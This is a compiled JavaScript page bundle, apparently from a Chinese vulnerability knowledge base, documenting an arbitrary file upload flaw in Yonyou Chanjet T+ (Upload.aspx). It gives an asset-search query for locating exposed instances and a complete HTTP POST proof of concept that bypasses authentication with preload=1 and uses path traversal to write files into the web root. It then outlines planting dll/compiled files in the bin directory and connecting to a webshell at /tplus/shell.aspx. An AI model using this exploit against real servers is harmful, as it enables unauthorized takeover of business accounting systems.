(window.webpackJsonp=window.webpackJsonp||[]).push([[57],{2466:function(a,s,t){a.exports=t.p+"assets/img/1662017510454-8bb328d0-35ee-42f9-a36a-625e95a5cfc2-2353804.d2e14fae.png"},2467:function(a,s,t){a.exports=t.p+"assets/img/1662034256298-447ab241-2def-46e0-a97d-9dae60549044.09fbccf4.png"},2468:function(a,s,t){a.exports=t.p+"assets/img/1662034644623-835164ab-e259-41ab-9999-2a5ef462a462.1cabf801.png"},2469:function(a,s,t){a.exports=t.p+"assets/img/1662037558563-ffb9835f-fc57-4d45-bc08-dfdf5cb2892d.ef126ae3.png"},2470:function(a,s,t){a.exports=t.p+"assets/img/1662037573454-3bc3ef0c-3ff2-46b6-b90a-ef3c72150be2.8031c988.png"},2471:function(a,s,t){a.exports=t.p+"assets/img/1662037605211-d44eed98-a1e1-4bac-85be-bb2909844f68.8263ea5d.png"},3240:function(a,s,t){"use strict";t.r(s);var e=t(64),n=Object(e.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"用友-畅捷通t-upload-aspx-任意文件上传漏洞"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#用友-畅捷通t-upload-aspx-任意文件上传漏洞"}},[a._v("#")]),a._v(" 用友 畅捷通T+ Upload.aspx 任意文件上传漏洞")]),a._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[a._v("#")]),a._v(" 漏洞描述")]),a._v(" "),s("p",[a._v("用友 畅捷通T+ Upload.aspx接口存在任意文件上传漏洞，攻击者通过 preload 参数绕过身份验证进行文件上传，控制服务器")]),a._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[a._v("#")]),a._v(" 漏洞影响")]),a._v(" "),s("a-checkbox",{attrs:{checked:""}},[a._v("用友 畅捷通T+")]),s("br"),a._v(" "),s("h2",{attrs:{id:"网络测绘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[a._v("#")]),a._v(" 网络测绘")]),a._v(" "),s("a-checkbox",{attrs:{checked:""}},[a._v('app="畅捷通-TPlus"')]),s("br"),a._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[a._v("#")]),a._v(" 漏洞复现")]),a._v(" "),s("p",[a._v("登录页面")]),a._v(" "),s("p",[s("img",{attrs:{src:t(2466),alt:"img"}})]),a._v(" "),s("p",[a._v("存在漏洞的接口为"),s("code",[a._v("/tplus/SM/SetupAccount/Upload.aspx")]),a._v(", 对应文件 "),s("code",[a._v("App_Web_upload.aspx.9475d17f.dll")])]),a._v(" "),s("p",[s("img",{attrs:{src:t(2467),alt:"img"}})]),a._v(" "),s("p",[a._v("上传文件类型验证不完善，可上传任意文件到服务器中的任意位置，验证POC")]),a._v(" "),s("div",{staticClass:"language-html line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-html"}},[s("code",[a._v('POST /tplus/SM/SetupAccount/Upload.aspx?preload=1 HTTP/1.1\nHost:\nAccept: */*\nAccept-Encoding: gzip, deflate\nContent-Length: 261\nUser-Agent: Mozilla/5.0 (iPod; U; CPU iPhone OS 3_0 like Mac OS X; ko-KR) AppleWebKit/535.16.4 (KHTML, like Gecko) Version/3.0.5 Mobile/8B117 Safari/6535.16.4\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryVXR9biLu\nConnection: close\n\n------WebKitFormBoundaryVXR9biLu\nContent-Disposition: form-data; name="File1";filename="../../../../../../../Program Files (x86)/Chanjet/TPlusStd/WebSite/1.txt"\nContent-Type: image/jpeg\n\n1\n------WebKitFormBoundaryVXR9biLu--\n')])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br"),s("span",{staticClass:"line-number"},[a._v("7")]),s("br"),s("span",{staticClass:"line-number"},[a._v("8")]),s("br"),s("span",{staticClass:"line-number"},[a._v("9")]),s("br"),s("span",{staticClass:"line-number"},[a._v("10")]),s("br"),s("span",{staticClass:"line-number"},[a._v("11")]),s("br"),s("span",{staticClass:"line-number"},[a._v("12")]),s("br"),s("span",{staticClass:"line-number"},[a._v("13")]),s("br"),s("span",{staticClass:"line-number"},[a._v("14")]),s("br"),s("span",{staticClass:"line-number"},[a._v("15")]),s("br")])]),s("p",[a._v("由于应用为预编译的，直接上传的 "),s("code",[a._v("aspx木马")]),a._v("无法直接利用，需要通过上传 "),s("code",[a._v("dll 与 compiled")]),a._v("文件后利用Webshell")]),a._v(" "),s("p",[s("img",{attrs:{src:t(2468),alt:"img"}})]),a._v(" "),s("p",[a._v("将 "),s("code",[a._v("dll 与 compiled")]),a._v(" 文件上传至 Web应用的 bin目录上，aspx上传至 Web根目录下")]),a._v(" "),s("p",[s("img",{attrs:{src:t(2469),alt:"img"}})]),a._v(" "),s("p",[s("img",{attrs:{src:t(2470),alt:"img"}})]),a._v(" "),s("p",[s("img",{attrs:{src:t(2471),alt:"img"}})]),a._v(" "),s("p",[a._v("再访问写入的Webshell进行连接")]),a._v(" "),s("div",{staticClass:"language-html line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-html"}},[s("code",[a._v("/tplus/shell.aspx?preload=1\t\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])])],1)}),[],!1,null,null,null);s.default=n.exports}}]);